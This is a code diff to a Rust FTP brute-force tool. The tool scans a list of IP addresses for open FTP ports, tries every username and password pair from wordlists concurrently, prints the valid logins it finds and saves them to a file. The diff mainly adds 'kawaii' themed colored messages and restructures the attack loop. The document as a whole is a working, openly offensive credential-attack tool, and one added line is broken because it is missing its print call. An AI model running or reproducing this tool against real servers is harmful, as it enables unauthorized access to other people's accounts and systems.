@@ -25,6 +25,12 @@ const IP_LIST_FILE: &str = "ips.txt";
 const USERNAME_FILE: &str = "usernames.txt";
 const PASSWORD_FILE: &str = "passwords.txt";
 
+// === Colors for Ultimate Kawaii Experience ===
+const PURPLE: &str = "\x1b[38;5;135m"; // Purple 💜
+const ORANGE: &str = "\x1b[38;5;214m"; // Orange 🍊
+const PINK: &str = "\x1b[38;5;213m";   // Pink 💖
+const RESET: &str = "\x1b[0m";         // Reset
+
 // === Helper Functions ===
 
 fn load_lines<P: AsRef<Path>>(path: P) -> Result<Vec<String>> {
@@ -93,26 +99,34 @@ async fn try_ftp_login(addr: &str, user: &str, pass: &str) -> Result<bool> {
 // === Main Brute-force Function ===
 
 pub async fn run(_target: &str) -> Result<()> {
-    println!("=== FTP Bruteforce (Hardcoded Ports + Turbo Batch) ===");
+   println!("{PURPLE}");
+    println!("             (｡♥‿♥｡) Welcome oni-chan to Kawaii FTP Brute-forcer! (｡♥‿♥｡)");
+    println!("   ／人◕ ‿‿ ◕人＼       Let's find those passwords, Senpai! UwU");
+    println!("    ~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~");
+    println!("{RESET}");
+
+    println!("{PURPLE}~(>w<)~ Initiating super kawaii scanning sequence~ {RESET}");
+
 
     let users = load_lines(USERNAME_FILE)?;
     let passes = load_lines(PASSWORD_FILE)?;
     let found = Arc::new(Mutex::new(Vec::new()));
     let semaphore = Arc::new(Semaphore::new(GLOBAL_CONCURRENCY));
 
-
     let file = File::open(IP_LIST_FILE)?;
     let reader = BufReader::new(file);
 
-    println!("[*] Starting...");
+ println!("{PURPLE}[*] Warming up, preparing sparkle magic... ✨ {RESET}");
+println!("{ORANGE}[*] Starting scan of cute servers... nyaa~~ {RESET}");
+
 
     let mut all_tasks = FuturesUnordered::new();
 
-for line in reader.lines() {
-    let ip = line?.trim().to_string(); // <-- Fix here!
-    if ip.is_empty() {
-        continue;
-    }
+    for line in reader.lines() {
+        let ip = line?.trim().to_string();
+        if ip.is_empty() {
+            continue;
+        }
 
         let users = users.clone();
         let passes = passes.clone();
@@ -120,110 +134,108 @@ for line in reader.lines() {
         let sem = Arc::clone(&semaphore);
 
         all_tasks.push(tokio::spawn(async move {
-           let open_ports = {
-    let mut scan_tasks = FuturesUnordered::new();
-for &port in PORTS {
-    let ip = ip.clone();
-        let port_scan_sem = Arc::new(Semaphore::new(MAX_PORT_SCAN_CONCURRENCY));
-    let port_scan_sem = Arc::clone(&port_scan_sem); // <-- Important: clone inside loop
-    scan_tasks.push(tokio::spawn(async move {
-        let _permit = port_scan_sem.acquire_owned().await.unwrap(); // <-- Use it here!
-        let addr = format_addr(&ip, port);
-        match quick_ftp_check(&addr).await {
-            Ok(true) => Some(port),
-            _ => None,
-        }
-    }));
-}
-    let mut ports = Vec::new();
-    while let Some(res) = scan_tasks.next().await {
-        if let Ok(Some(port)) = res {
-            ports.push(port);
-        }
-    }
-    ports
-};
+            // === Scan ports first ===
+            let open_ports = {
+                let mut scan_tasks = FuturesUnordered::new();
+                let port_scan_sem = Arc::new(Semaphore::new(MAX_PORT_SCAN_CONCURRENCY));
 
-
-
-            if open_ports.is_empty() {
-                println!("[-] {}: No FTP ports open.", ip);
-                return;
-            }
-
-            println!("[*] {}: Open FTP ports: {:?}", ip, open_ports);
-
-            for port in open_ports {
-                let addr = format_addr(&ip, port);
-                println!("[*] Brute-forcing {}", addr);
-
-                let mut tasks = FuturesUnordered::new();
-                let successes = Arc::new(Mutex::new(Vec::new()));
-                let stop_flag = Arc::new(Mutex::new(false));
-
-                let combos: Vec<(String, String)> = users.iter()
-                    .flat_map(|user| passes.iter().map(move |pass| (user.clone(), pass.clone())))
-                    .collect();
-
-                for chunk in combos.chunks(10) { // <= GROUP BATCH OF 10 ATTEMPTS
-                    if STOP_ON_SUCCESS && *stop_flag.lock().await {
-                        break;
-                    }
-                    let permit = sem.clone().acquire_owned().await.unwrap();
-                    let addr = addr.clone();
-                    let chunk = chunk.to_vec();
-                    let successes = Arc::clone(&successes);
-                    let stop_flag_clone = Arc::clone(&stop_flag);
-
-                    tasks.push(tokio::spawn(async move {
-                        let _permit = permit;
-                        if *stop_flag_clone.lock().await {
-                            return;
-                        }
-                        for (user, pass) in chunk {
-                            if *stop_flag_clone.lock().await {
-                                break;
-                            }
-                            match try_ftp_login(&addr, &user, &pass).await {
-                                Ok(true) => {
-                                    println!("[+] {} -> {}:{}", addr, user, pass);
-                                    successes.lock().await.push((addr.clone(), user.clone(), pass.clone()));
-                                    *stop_flag_clone.lock().await = true;
-                                    break;
-                                }
-                                Ok(false) => {}
-                                Err(_) => {}
-                            }
+                for &port in PORTS {
+                    let ip = ip.clone();
+                    let port_scan_sem = Arc::clone(&port_scan_sem);
+                    scan_tasks.push(tokio::spawn(async move {
+                        let _permit = port_scan_sem.acquire_owned().await.unwrap();
+                        let addr = format_addr(&ip, port);
+                        match quick_ftp_check(&addr).await {
+                            Ok(true) => Some(port),
+                            _ => None,
                         }
                     }));
                 }
 
-                while let Some(res) = tasks.next().await {
-                    res.ok();
+                let mut ports = Vec::new();
+                while let Some(res) = scan_tasks.next().await {
+                    if let Ok(Some(port)) = res {
+                        ports.push(port);
+                    }
+                }
+                ports
+            };
+
+            if open_ports.is_empty() {
+                ("{ORANGE}[-] {}: No FTP ports open... how sad, Senpai (｡•́︿•̀｡){RESET}", ip);
+                return;
+            }
+
+            println!("{PURPLE}[*] {}: Ports open and waiting for cuddles! {:?} 💜{RESET}", ip, open_ports);
+            println!("\n{PINK}[+] Bruteforce time, go go gooo {RESET}");
+           for port in open_ports {
+    let addr = format_addr(&ip, port);
+    println!("{PURPLE}[*] Brute-forcing {} nya~ (ง •̀_•́)ง {RESET}", addr);
+
+    let successes = Arc::new(Mutex::new(Vec::new()));
+    let stop_flag = Arc::new(Mutex::new(false));
+    let mut tasks = FuturesUnordered::new();
+
+    for user in &users {
+        for pass in &passes {
+            let addr = addr.clone();
+            let user = user.clone();
+            let pass = pass.clone();
+            let successes = Arc::clone(&successes);
+            let stop_flag = Arc::clone(&stop_flag);
+            let sem = Arc::clone(&sem);
+
+            tasks.push(tokio::spawn(async move {
+                let _permit = sem.acquire_owned().await.unwrap();
+
+                if STOP_ON_SUCCESS && *stop_flag.lock().await {
+                    return;
+                }
+
+                                           match try_ftp_login(&addr, &user, &pass).await {
+                                Ok(true) => {
+                                    println!("{PINK}[+] Sugoiii! {} -> {}:{} ~ 💖{RESET}", addr, user, pass);
+                                    successes.lock().await.push((addr.clone(), user.clone(), pass.clone()));
+                                    if STOP_ON_SUCCESS {
+                                        *stop_flag.lock().await = true;
+                                    }
+                                }
+                                Ok(false) => {
+                                    println!("{ORANGE}[-] No luck on {} -> {}:{} ... (´；ω；`) {RESET}", addr, user, pass);
+                                }
+                                Err(_) => {}
+                            }
+                        }));
+                    }
+                }
+
+    while let Some(res) = tasks.next().await {
+                    res.ok(); // Ignore individual errors
                 }
 
                 let successes_vec = successes.lock().await;
                 if successes_vec.is_empty() {
-                    println!("[!] {}:{}: No valid credentials.", ip, port);
+                    println!("{ORANGE}[!] {}: No valid credentials... bummerrr (つω`｡){RESET}", addr);
                 } else {
-                    println!("[+] {}:{}: Found {} valid login(s).", ip, port, successes_vec.len());
+                    println!("{PINK}[+] {}: Found {} valid login(s)! Senpai will be so proud! (๑˃̵ᴗ˂̵){RESET}", addr, successes_vec.len());
                     found.lock().await.extend(successes_vec.iter().cloned());
                 }
             }
         }));
     }
 
-    while let Some(res) = all_tasks.next().await {
+
+        while let Some(res) = all_tasks.next().await {
         res?;
     }
 
-    let creds = found.lock().await;
+        let creds = found.lock().await;
     if creds.is_empty() {
-        println!("\n[-] No credentials found.");
+        println!("\n{ORANGE}[-] No credentials found... Senpai will be disappointed... ಥ_ಥ{RESET}");
     } else {
-        println!("\n[+] Valid credentials found:");
+        println!("\n{PINK}[+] Valid credentials found, yattaaa!!! (ﾉ◕ヮ◕)ﾉ*:･ﾟ✧{RESET}");
         for (host, user, pass) in creds.iter() {
-            println!("    {} -> {}:{}", host, user, pass);
+            println!("{PINK}    {} -> {}:{} {RESET}", host, user, pass);
         }
         if SAVE_RESULTS {
             let file_path = Path::new(OUTPUT_FILE);
@@ -231,7 +243,7 @@ for &port in PORTS {
             for (host, user, pass) in creds.iter() {
                 writeln!(file, "{} -> {}:{}", host, user, pass)?;
             }
-            println!("[+] Results saved to '{}'", file_path.display());
+            println!("{PINK}[+] Results saved to '{}', uwu~ {RESET}", file_path.display());
         }
     }
 
